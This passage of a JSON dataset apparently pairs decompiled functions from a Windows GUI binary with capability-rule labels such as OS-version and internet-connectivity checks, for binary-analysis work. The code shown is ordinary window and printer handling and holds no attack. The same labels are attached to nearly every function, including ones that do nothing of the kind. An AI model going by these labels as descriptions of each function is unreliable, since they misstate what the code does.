        "decompiled_code": "\nvoid __thiscall fcn.0041cd96(int32_t param_1, uint param_2)\n\n{\n    if (*(param_1 + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_SetWindowLongA)(*(param_1 + 0x1c), 0xfffffff4, param_2);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041cdb3. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0x94))();\n    return;\n}\n",
        "token_count": 141
    },
    "0041cdb9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041cdb9(int32_t param_1, uint param_2)\n\n{\n    if (*(param_1 + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_ShowWindow)(*(param_1 + 0x1c), param_2);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041cdd4. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0xa0))();\n    return;\n}\n",
        "token_count": 134
    },
    "0041cdda": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041cdda(int32_t param_1)\n\n{\n    if (*(param_1 + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_IsWindowEnabled)(*(param_1 + 0x1c));\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041cdef. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0xa4))();\n    return;\n}\n",
        "token_count": 124
    },
    "0041cdf5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041cdf5(int32_t param_1, uint param_2)\n\n{\n    if (*(param_1 + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_EnableWindow)(*(param_1 + 0x1c), param_2);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041ce10. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0xa8))();\n    return;\n}\n",
        "token_count": 133
    },
    "0041ce16": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041ce16(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x4c) == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_SetFocus)(*(param_1 + 0x1c));\n        fcn.0041eeb7(uVar1);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041ce31. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0xb0))();\n    return;\n}\n",
        "token_count": 147
    },
    "0041ce37": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ce37(int32_t arg_8h, uint X, uint Y, uint cx, uint cy, uint uFlags)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x4c) == 0) {\n        if (arg_8h != 0) {\n            arg_8h = *(arg_8h + 0x1c);\n        }\n        (*_sym.imp.USER32.dll_SetWindowPos)(*(in_ECX + 0x1c), arg_8h, X, Y, cx, cy, uFlags);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041ce6d. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x4c) + 0x9c))();\n    return;\n}\n",
        "token_count": 200
    },
    "0041ce73": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041ce73(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if ((param_1 != 0) && (*(param_1 + 0x4c) == 0)) {\n        uVar1 = (*_sym.imp.USER32.dll_GetParent)(*(param_1 + 0x1c));\n        iVar2 = fcn.0041b576(uVar1);\n        if ((iVar2 != 0) && (*(iVar2 + 0x48) != 0)) {\n            (**(**(iVar2 + 0x48) + 0x9c))(param_1, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 159
    },
    "0041ceb4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpString2\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0041ceb4(uint lpString1, uint iMaxLength)\n\n{\n    uint uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint lpString2;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    if (*(extraout_ECX + 0x4c) == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_GetWindowTextA)(*(extraout_ECX + 0x1c), *(unaff_EBP + 8), *(unaff_EBP + 0xc));\n    }\n    else {\n        piVar2 = fcn.0041bc88();\n        iVar3 = (**(*piVar2 + 0xc))();\n        *(unaff_EBP + -0x10) = iVar3 + 0x10;\n        iVar3 = **(extraout_ECX + 0x4c);\n        *(unaff_EBP + -4) = 0;\n        (**(iVar3 + 0x8c))(unaff_EBP + -0x10);\n        (*_sym.imp.KERNEL32.dll_lstrcpynA)(*(unaff_EBP + 8), *(unaff_EBP + -0x10), *(unaff_EBP + 0xc));\n        uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*(unaff_EBP + 8));\n        fcn.00401180();\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar1;\n}\n",
        "token_count": 419
    },
    "0041cf34": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint fcn.0041cf34(void)\n\n{\n    uint uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    if (*(extraout_ECX + 0x4c) == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_GetWindowTextLengthA)(*(extraout_ECX + 0x1c));\n    }\n    else {\n        piVar2 = fcn.0041bc88();\n        iVar3 = (**(*piVar2 + 0xc))();\n        *(unaff_EBP + -0x10) = iVar3 + 0x10;\n        iVar3 = **(extraout_ECX + 0x4c);\n        *(unaff_EBP + -4) = 0;\n        (**(iVar3 + 0x8c))(unaff_EBP + -0x10);\n        uVar1 = *(*(unaff_EBP + -0x10) + -0xc);\n        fcn.00401180();\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar1;\n}\n",
        "token_count": 315
    },
    "0041d076": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d076(uint lpString2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GlobalLock;\n    if (*(in_ECX + 0x70) != 0) {\n        var_4h = in_ECX;\n        iVar2 = (*_sym.imp.KERNEL32.dll_GlobalLock)(*(in_ECX + 0x70));\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(*(iVar2 + 2) + iVar2, lpString2);\n        if ((iVar2 == 0) && (iVar2 = sub.WINSPOOL.DRV_OpenPrinterA(lpString2, &var_4h, 0),  iVar2 != 0)) {\n            if (*(in_ECX + 0x6c) != 0) {\n                fcn.00426e2d(*(in_ECX + 0x6c));\n            }\n            uVar3 = sub.WINSPOOL.DRV_DocumentPropertiesA(0, var_4h, lpString2, 0, 0, 0);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x42, uVar3);\n            *(in_ECX + 0x6c) = uVar3;\n            uVar3 = (*pcVar1)(uVar3);\n            iVar2 = sub.WINSPOOL.DRV_DocumentPropertiesA(0, var_4h, lpString2, uVar3, 0, 2);\n            if (iVar2 != 1) {\n                fcn.00426e2d(*(in_ECX + 0x6c));\n                *(in_ECX + 0x6c) = 0;\n            }\n            sub.WINSPOOL.DRV_ClosePrinter(var_4h);\n        }\n    }\n    return;\n}\n",
        "token_count": 434
    },
    "0041d357": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0041d357(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    \n    iVar1 = fcn.0043500e();\n    if (((*(iVar1 + 4) != 0) && (*param_1 == 0)) && (iVar1 = fcn.0041d2c2(param_1),  iVar1 != 0)) {\n        return 1;\n    }\n    piVar2 = fcn.00408bb5();\n    piVar4 = piVar2;\n    if (piVar2 != NULL) {\n        piVar4 = piVar2[7];\n    }\n    iVar1 = fcn.0041f3aa(piVar4, param_1);\n    if (iVar1 == 0) {\n        if (piVar2 != NULL) {\n            fcn.0041eeb7(*param_1);\n            piVar4 = fcn.0041fe34();\n            if (piVar4 != piVar2) {\n                uVar3 = (**(*piVar2 + 0x100))(param_1);\n                return uVar3;\n            }\n        }\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 302
    },
    "0041d672": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0041d672(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.00434fe8();\n    if (*(iVar1 + 0x14) == '\\0') {\n        iVar1 = fcn.00434fd8();\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        uVar2 = (*_sym.imp.USER32.dll_SetWindowsHookExA)(0xffffffff, 0x41d4f4, 0, uVar2);\n        *(iVar1 + 0x2c) = uVar2;\n    }\n    return;\n}\n",
        "token_count": 142
    },
    "0041d965": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpWndClass\n\nuint __cdecl\nfcn.0041d965(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint arg_8h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_10h;\n    uint lpWndClass;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    iVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = &lpWndClass;\n    iVar4 = (*_sym.imp.USER32.dll_GetClassInfoA)(*(iVar1 + 0x10), *(iVar1 + 0x24), unaff_EBP + -0x40);\n    if (iVar4 != 0) {\n        uVar5 = 1;\n        goto code_r0x0041da45;\n    }\n    iVar3 = (*_sym.imp.USER32.dll_RegisterClassA)(iVar1);\n    if (iVar3 == 0) {\ncode_r0x0041d9ea:\n        uVar5 = 0;\n    }\n    else {\n        *(unaff_EBP + -0x18) = 1;\n        iVar4 = fcn.00434fe8();\n        if (*(iVar4 + 0x14) != '\\0') {\n            fcn.00437b0b(1);\n            *(unaff_EBP + -4) = 0;\n            iVar4 = fcn.00434fe8();\n            pcVar2 = _sym.imp.KERNEL32.dll_lstrlenA;\n            *(unaff_EBP + -0x14) = iVar4 + 0x34;\n            iVar4 = (*pcVar2)(iVar4 + 0x34);\n            iVar6 = (*pcVar2)(*(iVar1 + 0x24));\n            if (0xfff < iVar4 + 2 + iVar6) goto code_r0x0041d9ea;\n            uVar7 = (*pcVar2)(*(unaff_EBP + -0x14));\n            uVar5 = *(iVar1 + 0x24);\n            *(unaff_EBP + 8) = uVar7;\n            iVar4 = (*pcVar2)(uVar5);\n            pcVar2 = _sym.imp.KERNEL32.dll_lstrcatA;\n            if (*(unaff_EBP + 8) + 2 + iVar4 < 0x1000) {\n                (*_sym.imp.KERNEL32.dll_lstrcatA)(*(unaff_EBP + -0x14), *(iVar1 + 0x24));\n                *(unaff_EBP + 10) = 10;\n                *(unaff_EBP + 0xb) = 0;\n                (*pcVar2)(*(unaff_EBP + -0x14), unaff_EBP + 10);\n            }\n            else {\n                uVar5 = *(iVar1 + 0x10);\n                *(unaff_EBP + -0x18) = 0;\n                (*_sym.imp.USER32.dll_UnregisterClassA)(*(iVar1 + 0x24), uVar5);\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00437b6e(1);\n        }\n        uVar5 = *(unaff_EBP + -0x18);\n    }\ncode_r0x0041da45:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar5;\n}\n",
        "token_count": 931
    },
    "0041da9d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0041da9d(int32_t *arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    while( true ) {\n        if (arg_8h[4] == 0) {\n            return NULL;\n        }\n        if ((((arg_ch == *arg_8h) && (arg_10h == arg_8h[1])) && (arg_8h[2] <= arg_14h)) &&\n           (arg_14h < arg_8h[3] || arg_14h == arg_8h[3])) break;\n        arg_8h = arg_8h + 6;\n    }\n    return arg_8h;\n}\n",
        "token_count": 169
    },
    "0041db4e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041db4e(int32_t *arg_8h, uint hWnd, int32_t *lprc2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint lpRect;\n    uint var_8h;\n    \n    uVar2 = (*_sym.imp.USER32.dll_GetParent)(hWnd);\n    if ((arg_8h == NULL) || (*arg_8h != 0)) {\n        (*_sym.imp.USER32.dll_GetWindowRect)(hWnd, &lpRect);\n        pcVar1 = _sym.imp.USER32.dll_ScreenToClient;\n        (*_sym.imp.USER32.dll_ScreenToClient)(uVar2, &lpRect);\n        (*pcVar1)(uVar2, &var_8h);\n        iVar3 = (*_sym.imp.USER32.dll_EqualRect)(&lpRect, lprc2);\n        if (iVar3 == 0) {\n            if (arg_8h == NULL) {\n                (*_sym.imp.USER32.dll_SetWindowPos)\n                          (hWnd, 0, *lprc2, lprc2[1], lprc2[2] - *lprc2, lprc2[3] - lprc2[1], 0x14);\n            }\n            else {\n                iVar3 = (*_sym.imp.USER32.dll_DeferWindowPos)(*arg_8h);\n                *arg_8h = iVar3;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 336
    },
    "0041e27f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041e27f(int32_t hdc, uint arg_ch, int32_t arg_10h, int32_t hgdiobj, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint lpvObject;\n    uint crColor;\n    \n    if ((((hdc == 0) || (hgdiobj == 0)) || (arg_10h == 1)) || ((arg_10h == 0 || (arg_10h == 5)))) {\ncode_r0x0041e2ee:\n        uVar2 = 0;\n    }\n    else {\n        if (arg_10h == 2) {\n            iVar1 = fcn.00426ca0(arg_ch, 2);\n            if (iVar1 == 0) goto code_r0x0041e2ee;\n        }\n        (*_sym.imp.GDI32.dll_GetObjectA)(hgdiobj, 0xc, &lpvObject);\n        (*_sym.imp.GDI32.dll_SetBkColor)(hdc, crColor);\n        if (arg_18h == -1) {\n            arg_18h = (*_sym.imp.USER32.dll_GetSysColor)(8);\n        }\n        (*_sym.imp.GDI32.dll_SetTextColor)(hdc, arg_18h);\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 308
    },
    "0041e4d9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0041e4d9(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    \n    iVar4 = fcn.0043500e();\n    if ((*(iVar4 + 0x3c) != 0) && (iVar1 = *(*(iVar4 + 0x3c) + 0x1c),  iVar1 != 0)) {\n        (*_sym.imp.USER32.dll_SendMessageA)(iVar1, 0x401, 0, 0);\n    }\n    piVar2 = *(iVar4 + 0x7c);\n    if ((param_1 != 0) && (piVar2 != NULL)) {\n        iVar3 = (*_sym.imp.USER32.dll_GetKeyState)(1);\n        if (-1 < iVar3) {\n            (**(*piVar2 + 0x160))(0xffffffff);\n        }\n    }\n    return;\n}\n",
        "token_count": 221
    },
    "0041ee3b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0041ee3b(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    iVar1 = fcn.0043500e();\n    if ((*(iVar1 + 0x14) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.0041baa4(0x426e5d);\n        iVar3 = fcn.0041bab6(0x60);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.00423296(0x43f8f8, 0x435fb7, 0x435f2c, 0x1c, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x14) = uVar4;\n        fcn.0041baa4(uVar2);\n    }\n    uVar2 = *(iVar1 + 0x14);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 373
    },
    "0041ef5f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0041ef5f(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00437973(0x434c5a);\n    iVar2 = fcn.00434fe8();\n    if ((*(iVar2 + 0x14) != '\\0') && (*(iVar1 + 0x28) != 0)) {\n        (*_sym.imp.USER32.dll_UnhookWindowsHookEx)(*(iVar1 + 0x28));\n        *(iVar1 + 0x28) = 0;\n    }\n    if (*(iVar1 + 0x14) != 0) {\n        *(iVar1 + 0x14) = 0;\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 171
    },
    "0041effc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041effc(int32_t *param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    \n    iVar2 = fcn.0041d1d1();\n    if (iVar2 == 0) goto code_r0x0041f047;\n    if (*(iVar2 + 0x1c) == param_1) {\n        iVar3 = fcn.00434fe8();\n        if (*(iVar3 + 0x14) == '\\0') {\n            iVar3 = fcn.00434fe8();\n            if (iVar2 == *(iVar3 + 4)) {\n                iVar3 = fcn.00434171();\n                if (iVar3 == 0) goto code_r0x0041f03c;\n            }\n            fcn.0043a912(0);\n        }\ncode_r0x0041f03c:\n        *(iVar2 + 0x1c) = 0;\n    }\n    if (*(iVar2 + 0x20) == param_1) {\n        *(iVar2 + 0x20) = 0;\n    }\ncode_r0x0041f047:\n    if (param_1[0x11] != NULL) {\n        (**(*param_1[0x11] + 0x50))();\n        param_1[0x11] = 0;\n    }\n    if (param_1[0x12] != NULL) {\n        (**(*param_1[0x12] + 4))(1);\n    }\n    param_1[0x12] = 0;\n    if ((*(param_1 + 0xe) & 1) != 0) {\n        iVar2 = fcn.0043500e();\n        iVar2 = *(iVar2 + 0x3c);\n        if ((iVar2 != 0) && (*(iVar2 + 0x1c) != 0)) {\n            fcn.0040bbe0(&var_30h, 0, 0x30);\n            var_28h = param_1[7];\n            var_30h = 0x28;\n            var_2ch = 1;\n            var_24h = var_28h;\n            (*_sym.imp.USER32.dll_SendMessageA)(*(iVar2 + 0x1c), 0x405, 0, &var_30h);\n        }\n    }\n    pcVar1 = _sym.imp.USER32.dll_GetWindowLongA;\n    iVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)(param_1[7], 0xfffffffc);\n    fcn.0041ee14();\n    iVar3 = (*pcVar1)(param_1[7], 0xfffffffc);\n    if (iVar3 == iVar2) {\n        piVar4 = (**(*param_1 + 0xf0))();\n        if (*piVar4 != 0) {\n            (*_sym.imp.USER32.dll_SetWindowLongA)(param_1[7], 0xfffffffc, *piVar4);\n        }\n    }\n    fcn.0041ef31();\n    (**(*param_1 + 0x114))();\n    return;\n}\n",
        "token_count": 744
    },
    "0041f262": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0041f262(uint32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h, int32_t *lprcDst, int32_t *arg_1ch, \n            int32_t arg_20h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    int32_t in_ECX;\n    int32_t hWinPosInfo;\n    int32_t lprcSrc;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_8h = arg_20h;\n    var_ch = 0;\n    var_10h = 0;\n    if (arg_1ch == NULL) {\n        (*_sym.imp.USER32.dll_GetClientRect)(*(in_ECX + 0x1c), &lprcSrc);\n    }\n    else {\n        lprcSrc = *arg_1ch;\n        var_1ch = arg_1ch[1];\n        var_18h = arg_1ch[2];\n        var_14h = arg_1ch[3];\n    }\n    uVar2 = arg_14h & 0xffff7fff;\n    if (uVar2 == 1) {\n        hWinPosInfo = 0;\n    }\n    else {\n        hWinPosInfo = (*_sym.imp.USER32.dll_BeginDeferWindowPos)(8);\n    }\n    for (iVar3 = (*_sym.imp.USER32.dll_GetTopWindow)(*(in_ECX + 0x1c)); iVar3 != 0;\n        iVar3 = (*_sym.imp.USER32.dll_GetWindow)(iVar3, 2)) {\n        uVar4 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(iVar3);\n        uVar4 = uVar4 & 0xffff;\n        iVar5 = fcn.0041eede(iVar3);\n        iVar1 = iVar3;\n        if ((((uVar4 != arg_10h) && (iVar1 = var_4h,  arg_8h <= uVar4)) && (uVar4 <= arg_ch)) && (iVar5 != 0)) {\n            (*_sym.imp.USER32.dll_SendMessageA)(iVar3, 0x361, 0, &hWinPosInfo);\n            iVar1 = var_4h;\n        }\n        var_4h = iVar1;\n    }\n    if (uVar2 == 1) {\n        if (arg_20h == 0) {\n            lprcDst[2] = var_10h;\n            lprcDst[1] = 0;\n            *lprcDst = 0;\n            lprcDst[3] = var_ch;\n        }\n        else {\n            (*_sym.imp.USER32.dll_CopyRect)(lprcDst, &lprcSrc);\n        }\n    }\n    else {\n        if ((arg_10h != 0) && (var_4h != 0)) {\n            piVar6 = fcn.0041eeb7(var_4h);\n            if (uVar2 == 2) {\n                lprcSrc = lprcSrc + *lprcDst;\n                var_1ch = var_1ch + lprcDst[1];\n                var_18h = var_18h - lprcDst[2];\n                var_14h = var_14h - lprcDst[3];\n            }\n            if ((arg_14h & 0x8000) == 0) {\n                (**(*piVar6 + 0x68))(&lprcSrc, 0);\n                fcn.0041db4e(&hWinPosInfo, var_4h, &lprcSrc);\n            }\n        }\n        if (hWinPosInfo != 0) {\n            (*_sym.imp.USER32.dll_EndDeferWindowPos)(hWinPosInfo);\n        }\n    }\n    return;\n}\n",
        "token_count": 950
    },
    "0041f4a6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0041f4a6(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *in_ECX;\n    int32_t *var_4h;\n    \n    var_4h = in_ECX;\n    if (*(in_ECX + 8) != '\\0') {\n        var_4h = NULL;\n        iVar1 = (**(*in_ECX + 0xe4))(arg_8h, arg_ch, &var_4h);\n        if (-1 < iVar1) {\n            return var_4h;\n        }\n    }\n    piVar2 = fcn.0041ee14();\n    return piVar2;\n}\n",
        "token_count": 165
    },
    "0041f5e1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
